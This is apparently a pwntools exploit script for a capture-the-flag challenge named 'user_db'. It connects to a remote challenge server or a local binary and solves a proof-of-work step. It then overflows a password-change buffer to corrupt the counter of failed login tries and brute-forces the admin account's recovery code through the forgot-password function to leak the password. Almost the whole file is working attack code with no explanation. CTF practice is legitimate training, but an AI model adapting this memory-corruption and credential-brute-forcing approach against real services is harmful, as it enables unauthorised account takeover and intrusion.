from pwn import *
import pwn
import random as rnd
import struct as st
from time import sleep
import re
import subprocess

context.arch = "amd64"
context.word_size = 64
context.bits = 64
context.os = "linux"

file = "./user_db"
exe_args = []
io: process = None
PREFIX = b"> "

speed = 0.2

def debug():
    gdb.attach(io, gdbscript=
    """
    
    """)
    input("debug")

def launch_remote():
    global file, io
    conn = "challenges.challenge-ecw.eu 35113"
    conn = conn.split(" ")
    io = remote(conn[0], conn[1])

def launch_local():
    global file, io
    io = process([file, *exe_args])
    if args.GDB:
        debug()

def solve_pow():
    leak = recvu(b"===================")
    pow = getb(leak, b") solve ", b"\n").decode()
    proc = subprocess.Popen(["solvepow", "solve", pow], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
    pow = proc.communicate()[0]
    sla(b"Solution? ", pow)

u64 = lambda d: pwn.u64(d.ljust(8, b"\0")[:8])
u32 = lambda d: pwn.u32(d.ljust(4, b"\0")[:4])
u16 = lambda d: pwn.u16(d.ljust(2, b"\0")[:2])
sla = lambda a, b: io.sendlineafter(a, b)
sa = lambda a, b: io.sendafter(a, b)
sl = lambda a: io.sendline(a)
recv = lambda: io.recv()
recvn = lambda a: io.recvn(a)
recvu = lambda a, b=False: io.recvuntil(a, b)
safe_link = lambda addr, ptr: (addr >> 12) ^ ptr
binsh = lambda: next(libc.search(b"/bin/sh\0"))
snum = lambda a, b: sla(a, str(b).encode("iso-8859-1"))
sprefix = lambda a: sla(PREFIX, a)
choice = lambda a: snum(PREFIX, a)
show_leak = lambda a, b: success("%s: %#018x" % (a, b))

def launch():
    if args.REMOTE:
        l = launch_remote
    else:
        l = launch_local
    with context.local(log_level=logging.ERROR):
        l()
    if args.POW:
        solve_pow()

def getb(d, a, b):
    a_ = d.find(a)
    if a_ == -1 or a == b"": a_ = 0
    b_ = d.find(b, a_+len(a))
    if b_ == -1 or b == b"": b_ = len(d)
    return d[a_+len(a):b_]

# ================================================================
# EXPLOIT HERE
# ================================================================

with context.local(log_level=logging.ERROR):
    exe = ELF(file)
    libc = ELF("./libc.so.6")

tries = 0
tries_prog = log.progress("Tries")
def exploit():
    users = {}
    recvu(b"Command")
    def create_user(name, passwd):
        sprefix(b"n")
        sprefix(name)
        sprefix(passwd)
        users[name] = int(getb(recvu(b"\nCommand"), b"code is ", b"\n"))
    def login(name, passwd):
        sprefix(b"l")
        start = time.time()
        sprefix(name)
        recvu(b"Password")
        start = time.time() - start
        sprefix(passwd)
        return start
    def change_passwd(name, passwd, code=None):
        sprefix(b"p")
        sprefix(name)
        if code is None:
            code = users[name]
        choice(code)
        sprefix(passwd)
    def forgor_passwd(name, code=None):
        sprefix(b"f")
        sprefix(name)
        if code is None:
            code = users[name]
        choice(code)
        leak = recvu(b"Command")
        leak = getb(leak, b"password is ", b"\n")
        if leak == b"w user":
            return None
        return leak

    change_passwd(b"", b"A"*0x54 + p8(0xf0), 0x20088//8)
    change_passwd(b"", p32(0x80101010), 0x20088//8) # set incorrect tries to big negative

    for i in range(0x4000):
        leak = forgor_passwd(b"admin", code=i)
        if leak is None:
            raise EOFError
        if b"no such" in leak:
            continue
        print(leak)
    
    for i in range(0x4000):
        leak = forgor_passwd(b"admin", code=i)


    io.interactive()
    input("end")
    exit()

# launch()
# exploit()
# exit()

while True:
    count = 0
    tries += 1
    tries_prog.status(str(tries))

    launch()
    try:
        exploit()
    except EOFError:
        pass

    with context.local(log_level=logging.ERROR):
        io.close()
    # sleep(0.05)
